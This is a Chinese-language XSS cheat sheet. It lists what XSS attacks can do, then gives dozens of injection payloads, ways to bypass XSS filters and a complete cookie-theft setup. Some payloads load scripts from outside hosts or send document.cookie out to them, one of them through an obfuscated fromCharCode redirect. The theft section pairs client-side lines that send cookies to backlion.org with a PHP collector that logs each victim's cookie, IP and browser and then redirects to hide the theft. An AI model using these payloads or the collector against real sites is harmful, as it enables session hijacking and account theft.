## XSS的危害有哪些？
1. 劫持Cookie，冒充用户身份进入网站，或者利用用户身份进一步执行操作
2. 构建Get和Post请求
3. XSS钓鱼，盗取各类用户的账号
4. 盗取各种用户账号，获取用户系统信息
5. 传播蠕虫病毒等
6. 劫持用户会话，  执行任意操作
7. 刷流量，执行弹窗广告
8. 网页挂马
9. 尽量DDOS攻击
11. XSS Wrom
12. ....等等

## 常见的测试XSS的代码如下：
```
<script>alert(/xss/)</script>
<scRiPt>alert(123);</scrIPt>
" onmouseov er="alert('xss')"< 测试上传文件名
[mdia=x,500,375]javascipt:alert(xss)[/media]
<script>alert("xss")</script>
<svg/onload=prompt(1)>
ed2k://|file|test|'+alert(document.cookie)+'|test/ dz3.1通用XSS
<a href='vbscript:MsgBox("XSS")'>link</a>
<script  src=http://www.backlion.org/xss.js></script>
%3Cscript%3Ealert('XSS')%3C/script%3E
<script>alert('xss')</script>
<script>alert('xss');</script>
<script>alert(document.cookie)</script>
<img scr="javascript:alert('xss')">
<img scr="javascript:alert('xss');">
<IMG src=javascript:alert('XSS')>
<iframe  src=http://www.backlion.org>
<iframe onload=alert(1)>
<IMG src=JaVaScRiPt:alert(/XSS/)>
<IMG src=JaVaScRiPt:alert("XSS")>、
 <IMG SRC=# onmouseover="alert('xxs')">
<img src="#" onerror=alert(/xss/)></img>
<img src="#" onerror=alert(/xss/)>
<video onerror=javascript:alert(1)><source>
<audio onerror=javascript:alert(1)><source>
<BODY BACKGROUND="javascript:alert('XSS')">
 <BODY ONLOAD=alert('XSS')>
<style> input {left:e-xpression (alert('xss'))}</style>
<style/style" STYLE="background: expre><ssion(alert(>"\\<XSS="));">
<form id=test onforminput=alert(1)> <input> </form> <button form=test onformchange=alert(2)>X
<div onclick ="alert('xss')">
<div onmouseenter="alert('xss')">
<a href="javascript:alert('xss')"></a>
<scr<script>ipt>src=alert(12)</scr<script>ipt>  //如果过滤<script>
<embed src="javascript:document.write('<script>alert(/wooyun/)</scirpt>')">
<SCRIPT>var a=String.fromCharCode(104,116,116,112,58,47,47,119,119,119,46,98,108,111,99,107,115,99,108,111,117,100,46,99,111,109,47,105,110,100,101,120,46,112,104,112,63,115,61);b=encodeURI(document.cookie);var c=a.concat(b);window.location.href=c;</SCRIPT>
<img src="javascript:eval(string.fromcharcode(97,108,101,114,116,40,39,88,83,83,39,41))">
<script>eval("\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x27\x29");
</script>
<img src=6 onerror=s=createElement(s1+s2);body.appendChild(s);s.src='http://t.cn/RUsPCEK';////// >
<img src="1" onerror=eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29")>
[email=2"onmouseover="alert(2)]2[/email]
```

## 绕过XSS fitter的方法
```
1. 利用<>标记注射html/javacript:
<script>alert(/xss/)</script>

2.利用html标签属性注射XSS
<img src="javascript:alert("xss")">

3.利用回车，table键盘，空格来突破xss fitter
<img src="javas   cript:alert("xss")">

4.利用对测试代码XSS进行accics转码突破
<IMG SRC="jav&#x0D;ascript:alert('XSS');">

5.利用事件测试xss绕过xss fitter
<img  src=c  onerror=alert("xss")>

6.利用css突破XSS fitter
<div sytle="backgroud-image:url(javascript:alert("xss"))>
<div style="width:expression(alert("xss"))>

7.扰乱过滤规则
如：进行大小写转换，大小写混合，不用双引号用单引号；利用全角进行绕过；利用标签和属性中用/**/和/和\0d等绕过

8.对其测试poc进行十进制和十六进制转换
9.对其测试的poc进行javaspit进行加密
```
## cookie信息获取实例
```
1.客服端代码:
<script>document.write('<img src="http://www.backlion.org/test.php?cookie='+document.cookie+'" width=0 height=0 border=0 />');</script>
<script>document.location = 'http://www.backlion.org/test.php?cookie='+ document.cookie;</script>
<script>document.localtion='http://www.backlion.org/test.asp?cookie='+document.cookie;</script>
<img src="http://www.backlion.org/test.asp?cookie='+document.cookie"></script>

2.服务器端代码:
<?php
$cookie = $_GET['cookie'];            //以GET方式获取cookie变量值
$ip = getenv ('REMOTE_ADDR');        //远程主机IP地址
$time=date('Y-m-d g:i:s');            //以“年-月-日 时：分：秒”的格式显示时间
$referer=getenv ('HTTP_REFERER');    //链接来源
$agent = $_SERVER['HTTP_USER_AGENT'];    //用户浏览器类型
$fp = fopen("cookie.txt", "a");        //打开cookie.txt，若不存在则创建它
fwrite($fp," IP: " .$ip. "\n Date and Time: " .$time. "\n User Agent:".$agent."\n Referer: ".$referer."\n Cookie: ".$cookie."\n\n\n");    //写入文件
fclose($fp);    //关闭文件
header("Location: http://www.baidu.com");    //将网页重定向到百度，增强隐蔽性
?>//访问形式为：http://hostname/cookie.txt
```

## 挖掘XSS的常用插件有：
```
1.firebug 
2.fiddler
```
